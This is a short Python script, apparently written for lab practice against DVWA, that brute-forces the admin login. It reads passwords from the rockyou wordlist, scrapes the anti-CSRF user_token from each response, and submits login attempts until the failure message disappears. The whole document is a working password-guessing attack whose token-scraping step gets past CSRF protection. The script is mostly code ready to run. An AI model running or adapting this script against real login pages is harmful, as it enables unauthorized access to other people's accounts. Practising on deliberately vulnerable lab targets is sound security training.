################################################################
#Objective: 
# Brute-force for password 
#Description: 
# GET request to find admin credential and grabbing
# the user_token (CSRF protection) before testing credential
#Date:
# 01/08/2017
#################################################################

#to make HTTP request
import requests
#to determine time needed to brute-force
import time

#passwords file 
wordfile = "/root/ctf/wordlist/rockyou.txt"

wd = open(wordfile)

#catchphrase prompted when invalid password
match='Username and/or password incorrect'

url = "http://192.168.1.1/DVWA/vulnerabilities/brute/index.php"
cookie = {'security':'high','PHPSESSID':'2furnbo3o84rlga1b4pau282o0'}
i=0

#begin timer to know the time needed to discover the password
start = time.time() 

for entry in wd: 

        #request to know the CSRF token delivered by the server
        request = requests.get(url,cookies=cookie)
        #I output the request HTML result 
        user_token = request.text
        #I look for the user_token field
        start_index = user_token.find('token')
        #I do accuracy with +14 and +46 to only recover the token value
        user_token = user_token[start_index+14:start_index+46].split('\n')[0]

        #delete line space in the entry from the dictionary
        entry = entry.rstrip("\n")
        datas = {'username':'admin','password':entry,'Login':'Login','user_token':user_token}
        #passing parameters in URL using "params" keyword argument
        request = requests.get(url, params=datas, cookies=cookie).text

        #print the password
        if match not in request:
                #discover time needed to discover the password
                end = time.time()
                delta = end-start
                timelapse = divmod(delta,60)

                print('Password:',entry)
                print('Discover in',timelapse)

        i=i+1
        if i%1000==0:
                print(i,'entry passed..')
